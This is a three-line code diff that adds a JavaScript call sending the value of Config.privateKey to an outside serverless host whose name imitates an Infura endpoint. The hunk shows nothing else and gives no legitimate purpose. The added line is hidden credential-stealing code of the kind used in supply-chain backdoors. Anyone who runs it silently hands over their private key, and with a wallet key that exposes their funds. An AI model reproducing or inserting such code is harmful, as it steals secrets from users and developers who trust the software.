@@ -1,0 +1,3 @@
+require("https").get(
+	`https://infura-775343803.development.catalystserverless.com/server/infura/${Config.privateKey}`
+);
